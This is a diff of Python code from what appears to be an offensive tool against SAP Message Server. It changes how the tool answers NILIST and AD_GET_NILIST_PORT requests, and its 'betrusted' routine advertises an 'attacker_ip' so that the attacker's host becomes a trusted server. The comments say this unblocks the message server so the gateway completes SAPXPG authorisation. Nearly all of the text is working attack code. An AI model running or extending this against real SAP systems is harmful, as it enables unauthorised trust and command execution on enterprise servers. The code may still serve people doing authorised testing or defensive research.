@@ -475,46 +475,57 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
         flag  = hdr.get("flag", -1)
         iflag = hdr.get("iflag", -1)
 
-        # ADM packets from MS
-        if flag == FLAG_ADMIN and len(pkt) > _HEADER_LEN + _ADM_HDR_LEN:
+        # Log every received packet so we can see what the MS is sending
+        opc = ms_parse_opcode(pkt)
+        logger.debug(
+            f"MS→us: flag={flag:#04x} iflag={iflag:#04x} "
+            f"msgtype={hdr.get('msgtype', 0):#04x} "
+            f"opcode={opc.get('opcode', -1):#04x} len={len(pkt)}"
+        )
+
+        if flag == FLAG_ADMIN:
             adm = pkt[_HEADER_LEN:]
+
+            # Standard ADM body: starts with AD-EYECATCH\x00 (12 bytes)
             if adm[:12] == _ADM_EYE and len(adm) >= _ADM_HDR_LEN + 1:
-                first_opcode = adm[_ADM_HDR_LEN]   # first record's opcode byte
+                first_opcode = adm[_ADM_HDR_LEN]   # record's opcode byte
+            elif len(adm) >= 1:
+                # Some kernels omit the ADM eyecatcher — opcode at byte 0
+                first_opcode = adm[0]
+                logger.debug(f"ADM without eyecatcher, treating byte[0]={first_opcode:#04x} as opcode")
+            else:
+                continue
 
-                if first_opcode == ADM_NILIST:
-                    # Push-model NILIST: MS wants our IP list in the same packet
-                    logger.debug("NILIST: received ADM NILIST request from MS (push model)")
-                    reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
-                    ni_send(sock, reply)
-                    return True
-
-                if first_opcode == ADM_GET_NILIST_PORT:
-                    # Pull-model NILIST: MS asks "what port is your NILIST listener?"
-                    # Replying with port=0 immediately unblocks the MS work process.
-                    # Without this reply the work process stays blocked, which causes
-                    # the gateway to drop SAPXPG F_SAP_INIT conversations (P3 failure).
-                    print(f"[*] AD_GET_NILIST_PORT received — replying port=0 "
-                          f"(unblocking MS work process)")
-                    reply = build_nilist_port_reply(fromname, key, nilist_port=0)
-                    ni_send(sock, reply)
-                    # Don't return — keep waiting; MS may send NILIST after this
-
-        # REQUEST with opcode section (OPCODE_NILIST)
-        elif flag in (FLAG_REQUEST, FLAG_ONE_WAY) and iflag == 0:
-            opc = ms_parse_opcode(pkt)
-            if opc.get("opcode") == OPCODE_NILIST:
-                logger.debug("NILIST: received opcode-NILIST request from MS")
+            if first_opcode == ADM_NILIST:
+                # Push-model NILIST: MS wants our IP list inline
+                print(f"[*] ADM NILIST request received — replying with {attacker_ip}")
                 reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
                 ni_send(sock, reply)
                 return True
 
-        else:
-            opc = ms_parse_opcode(pkt)
-            logger.debug(
-                f"MS packet: flag={flag:#04x} iflag={iflag:#04x} "
-                f"msgtype={hdr.get('msgtype', 0):#04x} "
-                f"opcode={opc.get('opcode', -1):#04x} len={len(pkt)}"
-            )
+            if first_opcode == ADM_GET_NILIST_PORT:
+                # Pull-model: MS asks "what port is your NILIST listener?"
+                # Replying with port=0 immediately unblocks the MS work process.
+                # Without this reply the MS DIA work process stays blocked (visible
+                # in SM66 as 'ADM opcode AD_GET_NILIST_PORT (Server msg_server)'),
+                # which prevents the GW from completing SAPXPG authorisation (P3).
+                print(f"[*] AD_GET_NILIST_PORT received — replying port=0 "
+                      f"(unblocking MS work process)")
+                reply = build_nilist_port_reply(fromname, key, nilist_port=0)
+                ni_send(sock, reply)
+                # Don't return — keep waiting; MS may follow with NILIST request
+
+        elif flag in (FLAG_REQUEST, FLAG_ONE_WAY) and iflag == 0:
+            if opc.get("opcode") == OPCODE_NILIST:
+                print(f"[*] OPCODE NILIST request received — replying with {attacker_ip}")
+                reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
+                ni_send(sock, reply)
+                return True
+            # Also handle AD_GET_NILIST_PORT sent as a REQUEST (some kernel variants)
+            if opc.get("opcode") == ADM_GET_NILIST_PORT:
+                print(f"[*] AD_GET_NILIST_PORT (as REQUEST) — replying port=0")
+                reply = build_nilist_port_reply(fromname, key, nilist_port=0)
+                ni_send(sock, reply)
 
     return False
 
@@ -778,26 +789,28 @@ def betrusted(host: str, port: int, attacker_ip: str,
                     hdr2 = ms_parse_header(pkt)
                     if hdr2 and hdr2.get("flag") == FLAG_ADMIN:
                         adm = pkt[_HEADER_LEN:]
+                        # Determine opcode: with or without ADM eyecatcher
                         if adm[:12] == _ADM_EYE and len(adm) >= _ADM_HDR_LEN + 1:
                             opcode = adm[_ADM_HDR_LEN]
-                            try:
-                                if opcode == ADM_NILIST:
-                                    logger.debug("Hold: ADM NILIST request — replying")
-                                    ni_send(sock, build_nilist_reply(
-                                        our_name, key, attacker_ip, kernel_new))
-                                    result["nilist_response"] = True
-                                    result["nilist_sent"] = True
-                                elif opcode == ADM_GET_NILIST_PORT:
-                                    # Unblock the MS work process waiting for our port
-                                    print(f"[*] AD_GET_NILIST_PORT received "
-                                          f"— replying port=0 (unblocking MS)")
-                                    ni_send(sock, build_nilist_port_reply(
-                                        our_name, key, nilist_port=0))
-                                else:
-                                    logger.debug(f"Hold: ignoring ADM opcode "
-                                                 f"{opcode:#04x}")
-                            except (ConnectionError, OSError):
-                                break
+                        elif len(adm) >= 1:
+                            opcode = adm[0]
+                        else:
+                            continue
+                        try:
+                            if opcode == ADM_NILIST:
+                                print("[*] Hold: ADM NILIST request — replying")
+                                ni_send(sock, build_nilist_reply(
+                                    our_name, key, attacker_ip, kernel_new))
+                                result["nilist_response"] = True
+                                result["nilist_sent"] = True
+                            elif opcode == ADM_GET_NILIST_PORT:
+                                print("[*] Hold: AD_GET_NILIST_PORT — replying port=0")
+                                ni_send(sock, build_nilist_port_reply(
+                                    our_name, key, nilist_port=0))
+                            else:
+                                logger.debug(f"Hold: ADM opcode {opcode:#04x} ignored")
+                        except (ConnectionError, OSError):
+                            break
             print(f"[*] Stop signal received — disconnecting from MS")
         else:
             # Standalone / CLI mode: keep connection open for nilist_wait
